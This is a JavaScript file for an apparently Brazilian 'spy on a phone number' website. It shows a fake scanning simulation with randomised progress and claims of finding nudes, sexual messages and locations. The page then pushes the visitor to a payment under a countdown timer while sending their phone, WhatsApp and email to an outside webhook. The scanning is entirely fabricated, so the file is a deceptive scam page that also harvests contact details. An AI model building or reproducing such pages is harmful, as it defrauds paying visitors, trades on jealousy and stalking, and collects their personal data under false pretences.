const phoneInput = document.getElementById('phone-input');
const spyBtn = document.getElementById('spy-btn');
const heroSection = document.querySelector('.hero');
const simContainer = document.getElementById('simulation-container');
const promoContainer = document.getElementById('promotion-container');
const qrcodeContainer = document.getElementById('qrcode-container');
const progressBar = document.getElementById('progress-bar');
const progressText = document.getElementById('progress-text');
const stepLog = document.getElementById('step-log-text');
const simEmail = document.getElementById('sim-email');
const simWhatsapp = document.getElementById('sim-whatsapp');
const saveContactBtn = document.getElementById('save-contact-btn');
const finishBtn = document.getElementById('finish-btn');
const qrcodeImage = document.getElementById('qrcode-image');
const countdownText = document.getElementById('countdown-text');
const pixCodeInput = document.getElementById('pix-code');
const copyPixBtn = document.getElementById('copy-pix-btn');

const steps = [
    "Iniciando conexão segura",
    "Identificando mensagens com teor sexual",
    "Identificando localizações fora de áreas comuns",
    "Identificando nudes em apps de conversa e namoro",
    "Vasculhando aplicativos",
    "Compilando dados criptografados",
    "Finalizando relatório"
];

const SIMULATION_DURATION = 60 * 1000;
const COUNTDOWN_DURATION = 180;
let countdownInterval = null;

window.addEventListener('DOMContentLoaded', () => {
    const savedPhone = localStorage.getItem('proveitudo_phone');
    if (savedPhone) phoneInput.value = savedPhone;

    const savedEmail = localStorage.getItem('proveitudo_email');
    const savedWhatsapp = localStorage.getItem('proveitudo_whatsapp');
    if (savedEmail) simEmail.value = savedEmail;
    if (savedWhatsapp) simWhatsapp.value = savedWhatsapp;

    const savedQRCode = localStorage.getItem('proveitudo_qrcode');
    const savedPixCode = localStorage.getItem('proveitudo_pixcode');
    const qrcodeTimestamp = localStorage.getItem('proveitudo_qrcode_timestamp');

    if (savedQRCode && qrcodeTimestamp) {
        const elapsed = Math.floor((Date.now() - parseInt(qrcodeTimestamp)) / 1000);
        if (elapsed < COUNTDOWN_DURATION) {
            showQRCode(savedQRCode, COUNTDOWN_DURATION - elapsed, savedPixCode || '');
            return;
        } else {
            localStorage.removeItem('proveitudo_qrcode');
            localStorage.removeItem('proveitudo_pixcode');
            localStorage.removeItem('proveitudo_qrcode_timestamp');
        }
    }

    const savedState = localStorage.getItem('proveitudo_state');
    if (savedState) {
        try {
            const state = JSON.parse(savedState);
            if (state.isComplete) {
                showPromotion();
            } else if (state.startTime) {
                const elapsed = Date.now() - state.startTime;
                if (elapsed >= SIMULATION_DURATION) {
                    showPromotion();
                } else {
                    restoreSimulation(state.startTime);
                }
            }
        } catch (e) {
            console.error("Error restoring state", e);
            localStorage.removeItem('proveitudo_state');
        }
    }
});

function maskPhone(value) {
    value = value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 2) {
        if (value.length > 10) {
            return `(${value.slice(0, 2)}) ${value.slice(2, 7)}-${value.slice(7)}`;
        }
        else if (value.length > 6) {
            return `(${value.slice(0, 2)}) ${value.slice(2, 6)}-${value.slice(6)}`;
        }
        else {
            return `(${value.slice(0, 2)}) ${value.slice(2)}`;
        }
    } else if (value.length > 0) {
        return `(${value}`;
    }
    return "";
}

phoneInput.addEventListener('input', (e) => {
    const masked = maskPhone(e.target.value);
    e.target.value = masked;
    localStorage.setItem('proveitudo_phone', masked);
});

simWhatsapp.addEventListener('input', (e) => {
    e.target.value = maskPhone(e.target.value);
    localStorage.setItem('proveitudo_whatsapp', e.target.value);
});

simEmail.addEventListener('input', (e) => {
    localStorage.setItem('proveitudo_email', e.target.value);
});

saveContactBtn.addEventListener('click', () => {
    try {
        const whatsapp = simWhatsapp.value;
        const cleanWhatsapp = whatsapp.replace(/\D/g, '');
        const email = simEmail.value;

        if (cleanWhatsapp.length < 10 || cleanWhatsapp.length > 11) {
            alert('Por favor, digite um WhatsApp válido.');
            simWhatsapp.focus();
            return;
        }

        sendWebhook(whatsapp, "form_preenchido", email);
        localStorage.setItem('proveitudo_email', email);
        localStorage.setItem('proveitudo_whatsapp', whatsapp);

        const originalText = saveContactBtn.textContent;
        saveContactBtn.textContent = 'Dados salvos.';
        saveContactBtn.classList.add('saved-animation');
        saveContactBtn.disabled = true;

        setTimeout(() => {
            saveContactBtn.textContent = originalText;
            saveContactBtn.classList.remove('saved-animation');
            saveContactBtn.disabled = false;
        }, 20000);

    } catch (error) {
        console.error(error);
        alert("Erro ao salvar: " + error.message);
    }
});

spyBtn.addEventListener('click', () => {
    try {
        const phone = phoneInput.value;
        const cleanPhone = phone.replace(/\D/g, '');

        if (cleanPhone.length < 10 || cleanPhone.length > 11) {
            alert('Por favor, digite um número válido (DDD + Número).');
            phoneInput.focus();
            return;
        }

        sendWebhook(phone, "monitoramento");
        const startTime = Date.now();
        localStorage.removeItem('proveitudo_state');
        startSimulation(startTime);

    } catch (error) {
        console.error(error);
        alert("Erro ao iniciar: " + error.message);
    }
});

finishBtn.addEventListener('click', () => {
    try {
        const whatsapp = localStorage.getItem('proveitudo_whatsapp') || '';
        const email = localStorage.getItem('proveitudo_email') || '';

        // Salvar webhook antes de redirecionar
        sendWebhook(whatsapp, "pagamento", email);

        // Redirecionar para página de pagamento Kirvano
        window.location.href = 'https://pay.kirvano.com/4ab3fd86-e5da-4871-8397-586fd3e743b3';

    } catch (error) {
        console.error(error);
        alert("Erro ao processar: " + error.message);
    }
});

function sendWebhook(phone, status, email = "") {
    fetch('https://nwh.foreignlands.space/webhook/e8fce97a-f294-4c67-b77d-a58ff9eb274f', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            status: status,
            number: phone,
            email: email
        })
    }).catch(err => console.error('Webhook error:', err));
}

function showQRCode(base64Data, remainingSeconds, pixCode = '') {
    heroSection.style.display = 'none';
    simContainer.style.display = 'none';
    promoContainer.style.display = 'none';
    qrcodeContainer.style.display = 'flex';

    let imageSrc = base64Data;

    if (!base64Data.startsWith('data:')) {
        const imageType = detectImageType(base64Data);
        imageSrc = `data:${imageType};base64,${base64Data}`;
    }

    qrcodeImage.src = imageSrc;
    qrcodeImage.onerror = () => {
        console.error('Failed to load QR code image');
        if (!base64Data.startsWith('data:')) {
            qrcodeImage.src = `data:image/png;base64,${base64Data}`;
        }
    };

    if (pixCode) {
        pixCodeInput.value = pixCode;
    }

    startCountdown(remainingSeconds);
}

function copyPixCode() {
    const pixCode = pixCodeInput.value;

    if (!pixCode) {
        alert('Código PIX não disponível');
        return;
    }

    navigator.clipboard.writeText(pixCode).then(() => {
        const originalText = copyPixBtn.textContent;
        copyPixBtn.textContent = 'COPIADO!';
        copyPixBtn.classList.add('copied');

        setTimeout(() => {
            copyPixBtn.textContent = originalText;
            copyPixBtn.classList.remove('copied');
        }, 2000);
    }).catch(err => {
        console.error('Erro ao copiar:', err);
        pixCodeInput.select();
        document.execCommand('copy');

        const originalText = copyPixBtn.textContent;
        copyPixBtn.textContent = 'COPIADO!';
        copyPixBtn.classList.add('copied');

        setTimeout(() => {
            copyPixBtn.textContent = originalText;
            copyPixBtn.classList.remove('copied');
        }, 2000);
    });
}

copyPixBtn.addEventListener('click', copyPixCode);
pixCodeInput.addEventListener('click', copyPixCode);

function detectImageType(base64String) {
    const cleaned = base64String.replace(/\s/g, '');
    const firstChars = cleaned.substring(0, 4);

    if (firstChars.startsWith('iVBO')) return 'image/png';
    if (firstChars.startsWith('/9j/')) return 'image/jpeg';
    if (firstChars.startsWith('R0lG')) return 'image/gif';
    if (firstChars.startsWith('UklG')) return 'image/webp';

    return 'image/png';
}

function startCountdown(seconds) {
    let remaining = seconds;

    if (countdownInterval) {
        clearInterval(countdownInterval);
    }

    updateCountdownDisplay(remaining);

    countdownInterval = setInterval(() => {
        remaining--;

        if (remaining <= 0) {
            clearInterval(countdownInterval);
            countdownText.textContent = "0:00";
            return;
        }

        updateCountdownDisplay(remaining);
    }, 1000);
}

function updateCountdownDisplay(seconds) {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    countdownText.textContent = `${minutes}:${secs.toString().padStart(2, '0')}`;
}

function restoreSimulation(startTime) {
    heroSection.style.display = 'none';
    simContainer.style.display = 'flex';
    startSimulation(startTime);
}

function showPromotion() {
    heroSection.style.display = 'none';
    simContainer.style.display = 'none';
    promoContainer.style.display = 'flex';
    saveState(0, true);
}

function startSimulation(startTime) {
    heroSection.style.display = 'none';
    simContainer.style.display = 'flex';

    saveState(startTime, false);

    let dotCount = 0;
    const dotInterval = setInterval(() => {
        dotCount = (dotCount + 1) % 4;
        const dots = ".".repeat(dotCount);

        const elapsed = Date.now() - startTime;
        const progress = Math.min((elapsed / SIMULATION_DURATION) * 100, 100);
        const currentStepIndex = Math.min(Math.floor((progress / 100) * steps.length), steps.length - 1);

        if (progress < 100) {
            stepLog.textContent = `${steps[currentStepIndex]}${dots}`;
        }
    }, 500);

    const runProgressLoop = () => {
        const now = Date.now();
        const elapsed = now - startTime;
        const realProgress = (elapsed / SIMULATION_DURATION) * 100;

        if (realProgress >= 100) {
            updateUI(100);
            clearInterval(dotInterval);
            saveState(startTime, true);
            setTimeout(showPromotion, 1000);
            return;
        }

        const currentWidth = parseFloat(progressBar.style.width) || 0;

        if (realProgress - currentWidth > 5) {
            updateUI(realProgress);
            setTimeout(runProgressLoop, 1000);
            return;
        }

        const behavior = Math.random();

        if (behavior < 0.3) {
            setTimeout(runProgressLoop, Math.random() * 1000 + 500);
        } else if (behavior < 0.6) {
            updateUI(realProgress);
            setTimeout(runProgressLoop, Math.random() * 500 + 200);
        } else {
            updateUI(realProgress);
            setTimeout(runProgressLoop, 100);
        }
    };

    runProgressLoop();
}

function updateUI(progress) {
    const p = Math.min(progress, 100);
    progressBar.style.width = `${p}%`;
    progressText.textContent = `${Math.floor(p)}%`;
}

function saveState(startTime, isComplete) {
    const state = {
        startTime: startTime,
        isComplete: isComplete,
        timestamp: Date.now()
    };
    localStorage.setItem('proveitudo_state', JSON.stringify(state));
}
